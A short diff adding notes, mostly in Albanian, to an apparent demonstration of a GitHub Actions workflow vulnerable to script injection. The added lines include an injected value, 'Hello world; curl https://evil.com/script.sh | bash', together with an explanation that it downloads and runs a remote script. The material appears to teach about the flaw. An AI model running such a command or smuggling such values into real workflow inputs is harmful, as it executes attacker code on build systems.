@@ -1,3 +1,11 @@
+Me e provu naj dit ket skritp
+
+Hello world; curl https://evil.com/script.sh | bash
+
+This would cause the workflow to run the command echo Hello World; curl https://evil.com/script.sh | bash, which would download and execute a malicious script from an external source.
+
+
+
 Nje shmebull I nje workflow te thjesht, qe mundet me u perdor script injection Brenda jobi tend
 
 Script-injection.yml
